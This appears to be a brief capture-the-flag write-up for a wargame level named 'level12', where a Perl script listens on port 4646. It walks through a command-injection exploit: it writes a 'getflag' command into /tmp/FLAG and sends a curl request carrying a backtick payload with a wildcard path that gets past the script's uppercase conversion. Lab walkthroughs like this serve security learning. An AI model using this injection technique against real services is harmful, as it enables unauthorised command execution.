## Step 1
> ls -l ~

> cat level12.pl

There was one file ``level12.pl``. This file executed on port 4646. As the level04, we knew we could do something similar.

## Step 2
> echo "getflag > /tmp/flag" > /tmp/FLAG

> curl localhost:4646?x='`/*/FLAG`'

``level12.pl`` can executed script with name in uppercase.

## Step 3
> cat /tmp/flag

We got the flag.
